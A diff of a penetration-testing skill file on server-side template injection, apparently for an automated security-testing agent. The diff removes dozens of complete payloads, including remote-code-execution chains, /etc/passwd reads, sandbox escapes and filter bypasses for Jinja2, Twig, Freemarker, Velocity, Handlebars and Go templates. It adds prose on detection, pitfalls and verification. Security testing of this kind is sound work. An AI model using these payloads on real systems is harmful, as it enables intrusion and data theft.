@@ -1,4 +1,4 @@
----
+﻿---
 name: ssti
 description: "Server-Side Template Injection exploitation across Jinja2, Twig, Freemarker, Velocity, Handlebars, and Go templates"
 category: specialized
@@ -66,19 +66,10 @@ Test each expression syntax. If the template engine evaluates arithmetic, inject
 When no output is rendered, use time-based or out-of-band detection:
 
 **Jinja2 time-based:**
-```
-{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}
-```
 
 **Freemarker time-based:**
-```
-<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}
-```
 
 **Velocity time-based:**
-```
-$class.inspect("java.lang.Runtime").getRuntime().exec('sleep 5')
-```
 
 ### Error-Based Detection
 
@@ -115,21 +106,12 @@ Inject syntax that triggers engine-specific errors to fingerprint:
 ### Fingerprinting via Object Inspection
 
 **Jinja2:**
-```
-{{config.__class__.__name__}}
-```
 Returns `Config` — confirms Jinja2.
 
 **Twig:**
-```
-{{_self.env.getExtensions()}}
-```
 Returns Twig extension list — confirms Twig.
 
 **Freemarker:**
-```
-${.version}
-```
 Returns Freemarker version string.
 
 ## Jinja2 / Python
@@ -137,65 +119,32 @@ Returns Freemarker version string.
 ### RCE Chains
 
 **Standard RCE (Flask/Jinja2):**
-```
-{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
-```
 
 **Alternative RCE path:**
-```
-{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
-```
 
 **Using cycler (Flask-specific):**
-```
-{{cycler.__init__.__globals__.os.popen('id').read()}}
-```
 
 **Using joiner:**
-```
-{{joiner.__init__.__globals__.os.popen('id').read()}}
-```
 
 **Using namespace:**
-```
-{{namespace.__init__.__globals__.os.popen('id').read()}}
-```
 
 ### File Read/Write
 
 **Read /etc/passwd:**
-```
-{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
-```
 
 **Read application source:**
-```
-{{config.__class__.__init__.__globals__['open']('app.py').read()}}
-```
 
 ### Sandbox Escape
 
 **Jinja2 sandboxed environment bypass (CVE-2024-22195):**
-```
-{{_self._joinargs(_self._getargs((request|attr('get')(request|attr('get')('__args__'))[0])))}}
-```
 
 **Attr filter bypass for sandbox:**
-```
-{{request|attr('args')|attr('get')('x')|attr('__class__')|attr('__base__')|attr('__subclasses__')()}}
-```
 
 ### Subclass Enumeration (Generic Python RCE)
 
-```
-{{''.__class__.__mro__[2].__subclasses__()}}
-```
 
 Locate `os._wrap_close` or `subprocess.Popen` in the list and invoke:
 
-```
-{{''.__class__.__mro__[2].__subclasses__()[X].__init__.__globals__['popen']('id').read()}}
-```
 
 Replace `X` with the index of the identified class.
 
@@ -204,37 +153,18 @@ Replace `X` with the index of the identified class.
 ### RCE Chains
 
 **Standard Twig RCE:**
-```
-_self.env.registerUndefinedFilterCallback("exec")
-_self.env.getFilter("id")
-```
 
 **Alternative using _self parent:**
-```
-self.env.registerUndefinedFilterCallback("system")
-self.env.getFilter("id")
-```
 
 **Using apply filter:**
-```
-{{['id']|filter('system')}}
-```
 
 ### File Operations
 
 **Read file via Twig:**
-```
-_self.env.registerUndefinedFilterCallback("file_get_contents")
-_self.env.getFilter("/etc/passwd")
-```
 
 ### Sandbox Escape
 
 **Twig sandbox escape via _self access:**
-```
-{{_self.env.registerUndefinedFilterCallback("exec")}}
-{{_self.env.getFilter("id")}}
-```
 
 The `_self` variable references the current template, and its `env` property gives access to the Twig environment, bypassing sandbox restrictions if the sandbox policy allows `_self` access.
 
@@ -243,142 +173,55 @@ The `_self` variable references the current template, and its `env` property giv
 ### RCE Chains
 
 **Execute system command:**
-```
-<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
-```
 
 **Alternative using ObjectConstructor:**
-```
-<#assign rt=objectConstructor("java.lang.Runtime")>${rt.getRuntime().exec("id")}
-```
 
 ### File Operations
 
 **Read file:**
-```
-<#assign file="freemarker.template.utility.FileReader"?new()>${file("/etc/passwd")}
-```
 
 **List directory:**
-```
-<#assign dir="freemarker.template.utility.ObjectConstructor"?new()>${dir("java.io.File", ".").list()}
-```
 
 ### Sandbox Bypass
 
 If `Execute` and `ObjectConstructor` are blocked, try:
 
-```
-<#assign classloader=objectConstructor("freemarker.template.TemplateModelException")?api.getClass().getProtectionDomain().getClassLoader()>
-<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
-```
 
 Or via Jython/other loaded libraries:
 
-```
-<#assign ex="org.apache.commons.jelly.impl.ScriptBlock"?eval>${ex}
-```
 
 ## Velocity / Java
 
 ### RCE Chains
 
 **Standard Velocity RCE:**
-```
-$class.inspect("java.lang.Runtime").getRuntime().exec('id')
-```
 
 **Alternative using tools:**
-```
-$tool.execute('id')
-```
 
 **Using context lookup:**
-```
-$context.get('tool').execute('id')
-```
 
 ### File Operations
 
 **Read file:**
-```
-$class.inspect("java.io.FileReader").new("/etc/passwd").readLine()
-```
 
 ### Sandbox Bypass
 
 If `$class` is restricted, try:
 
-```
-$!{T(java.lang.Runtime).getRuntime().exec('id')}
-```
 
 Or via reflection:
 
-```
-#set($expr=$class.inspect("java.lang.reflect.Method"))
-#set($method=$expr.invoke($class.inspect("java.lang.Runtime").getRuntime(), "exec", "id"))
-```
 
 ## Handlebars / Node.js
 
 ### RCE Chains
 
 **Prototype pollution RCE (Node.js < 4.2.0):**
-```
-{{#with "s"}} {{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string}}}}}}}}[1].prototype.hasOwnProperty.call(this,'caller')?this.constructor('return process')().mainModule.require('child_process').execSync('id'):null{{/with}}{{/with}}{{/with}}{{/with}}
-```
 
 **Simplified RCE (if require is accessible):**
-```
-{{#with "s" as |string|}}
-  {{#with "e"}}
-    {{#with split as |conslist|}}
-      {{this.pop}}
-      {{this.push (lookup string.sub "constructor")}}
-      {{this.pop}}
-      {{#with string}}
-        {{#with (joiner)}}
-          {{this.pop}}
-          {{this.push "return require('child_process').execSync('id')"}}
-          {{this.pop}}
-          {{#each conslist}}
-            {{#with (string.sub.apply 0 conslist)}}
-              {{this}}
-            {{/with}}
-          {{/each}}
-        {{/with}}
-      {{/with}}
-    {{/with}}
-  {{/with}}
-{{/with}}
-```
 
 ### File Read
 
-```
-{{#with "s" as |string|}}
-  {{#with "e"}}
-    {{#with split as |conslist|}}
-      {{this.pop}}
-      {{this.push (lookup string.sub "constructor")}}
-      {{this.pop}}
-      {{#with string}}
-        {{#with (joiner)}}
-          {{this.pop}}
-          {{this.push "return require('fs').readFileSync('/etc/passwd').toString()"}}
-          {{this.pop}}
-          {{#each conslist}}
-            {{#with (string.sub.apply 0 conslist)}}
-              {{this}}
-            {{/with}}
-          {{/each}}
-        {{/with}}
-      {{/with}}
-    {{/with}}
-  {{/with}}
-{{/with}}
-```
 
 ### Sandbox Bypass
 
@@ -389,29 +232,17 @@ Handlebars has no built-in sandbox. If `handlebars` is used with a custom `runti
 ### RCE Chains
 
 **Standard Go template RCE (custom FuncMap):**
-```
-{{println (call (index .Functions "exec") "id")}}
-```
 
 **Using template method calls:**
-```
-{{. | call (index .Functions "system") "id"}}
-```
 
 ### File Operations
 
 **Read file (if file functions are exposed):**
-```
-{{println (call (index .Functions "readFile") "/etc/passwd")}}
-```
 
 ### Sandbox Bypass
 
 Go templates have no built-in sandbox, but the `text/template` and `html/template` packages restrict what methods can be called on objects. If `reflect` is available:
 
-```
-{{println (call (index .Functions "reflect") "value")}}
-```
 
 ## Filter Bypass Techniques
 
@@ -420,92 +251,48 @@ Go templates have no built-in sandbox, but the `text/template` and `html/templat
 When WAFs block keyword patterns, encode payloads:
 
 **URL encoding:**
-```
-%7B%7B7%2A7%7D%7D
-```
 
 **Double URL encoding:**
-```
-%257B%257B7%252A7%257D%257D
-```
 
 **HTML entity encoding:**
-```
-&#123;&#123;7*7&#125;&#125;
-```
 
 **Unicode encoding (for Java engines):**
-```
-${"\u0024\u007B\u0037\u002A\u0037\u007D"}
-```
 
 ### String Concatenation
 
 **Jinja2 string concat:**
-```
-{{config['__cla'+'ss__']}}
-```
 
 **Freemarker string concat:**
-```
-${"freem"+"arker.template.utility.Exe"+"cute"?new()}
-```
 
 **Velocity string concat:**
-```
-$class.inspect("j"+"ava.lang.Runtime")
-```
 
 ### Case Manipulation
 
 **Mixed case (PHP/Twig):**
-```
-_SELF.ENV.REGISTERUNDEFINEDFILTERCALLBACK("exec")
-```
 
 ### Whitespace Bypass
 
 Insert tabs or newlines within keywords:
 
 **Jinja2:**
-```
-{{config.__class__.__init__.__globals__
-['os'].popen('id').read()}}
-```
 
 **Freemarker:**
-```
-<#assign ex="freemarker.template.utility
-.Execute"?new()>${ex("id")}
-```
 
 ### Null Byte Injection
 
 Some template engines ignore null bytes:
 
-```
-{{config.__class__.__init__.__globals__['os'].popen('i\x00d').read()}}
-```
 
 ### Alternative Class Chains
 
 When primary chain is blocked, enumerate alternatives:
 
 **Jinja2 subclass list:**
-```
-{{''.__class__.__mro__[2].__subclasses__()|length}}
-```
 
 Count subclasses, then iterate:
 
-```
-{{''.__class__.__mro__[2].__subclasses__()[N].__name__}}
-```
 
 **Freemarker class loading:**
-```
-<#assign classLoader=objectConstructor("java.net.URLClassLoader")>${classLoader.loadClass("com.example.Payload")}
-```
 
 ### Template Engine Switching
 
@@ -518,24 +305,15 @@ If one engine's payloads are blocked, try injecting syntax for a different engin
 ### Dynamic Variable Construction
 
 **Jinja2 with variable injection:**
-```
-{{()|attr(request.args.get('a'))}}
-```
 URL parameter: `?a=__class__`
 
 **Twig with variable injection:**
-```
-{{attribute(_self.env, request.query.a, request.query.b)}}
-```
 URL: `?a=registerUndefinedFilterCallback&b=exec`
 
 ### Polyglot Payloads
 
 Test multiple engines simultaneously:
 
-```
-$({{7*7}}=${7*7}<%= 7*7 %>)
-```
 
 If output contains `49` in multiple formats, multiple engines may be processing the input.
 
@@ -562,3 +340,24 @@ For every confirmed SSTI finding, record via `writeFinding`:
 - **Impact**: RCE, file read, file write, or information disclosure
 - **Request/Response**: Full HTTP exchange via `recordEvidence`
 - **Sanbox status**: Whether sandbox is active and whether bypass was achieved
+
+## Trigger Conditions
+
+Activate when user input is rendered or evaluated by a server-side template engine rather than simply stored or reflected. Signs: arithmetic payload `{{7*7}}` (or engine-appropriate syntax) returns `49`; error traces mention template internals (`UndefinedError`, `freemarker.template`, `Twig\Error`, `text/template`); parameters flow into email/PDF/report/document generators; or pages are built from user-driven template partials. Trigger on any reflected value that changes page structure, not just text. Do not trigger on purely client-side template engines (Handlebars/Mustache/Angular in the browser) — those are XSS, not SSTI.
+
+## Detection Approach
+
+First, fingerprint the engine: try each syntax variant (`{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `[[${7*7}]]`) against a reflected parameter; the one that returns `49` names the engine. If nothing renders, switch to blind: time-based (a sleep/expansion inside the expression) and out-of-band (expression that triggers an external fetch) detection. Never infer the engine from URL extension or framework guesses — confirm with evaluation. Once the engine is known, escalate from detection to reading: start with arithmetic confirmation, then file read, then RCE class-chains (`os`/`subprocess` for Jinja2, `Execute`/`ObjectConstructor` for Freemarker/Velocity, environment access for Twig). When a direct chain is blocked, attempt sandbox escape specific to that engine, then fallback to filter bypass (encoding, string concat, case/whitespace, alternative class enumeration, polyglots). Stop and record if every evaluated payload returns the literal input unchanged — that indicates a non-rendering context.
+
+## Pitfalls
+
+- Inferring the engine from error messages or framework alone — a Flask app is usually Jinja2 but confirmation requires actual evaluation.
+- Assuming arithmetic reflection equals RCE — file read or command execution still must be demonstrated.
+- Blind SSTI without timing/OOB evidence: a delayed response must be *measured* (repeat >3 times) and compared to a baseline, or it is a network artifact.
+- Overclaiming sandbox bypass from "no error" — bypass requires demonstrated execution after the restriction, not merely absence of an error.
+- Mixing client-side template syntax into SSTI attempts; browser engines evaluate locally and never reach server RCE.
+- One blocked payload ≠ patched — WAFs block keywords; switch to concat/encoding before concluding.
+
+## Verification & Impact
+
+CONFIRMED when the raw response shows evaluated output: `49` for detection, actual file content for read, or command output containing `uid=`/`groups=` for RCE. Blind cases are CONFIRMED only with measured timing deltas or an observed OAST callback; otherwise SUSPECTED. Document impact by capability proven — information disclosure (file read), RCE (command output), or sandbox-escape context — plus engine, endpoint, parameter, and exact payload. Always attach the full request/response exchange via `recordEvidence`.
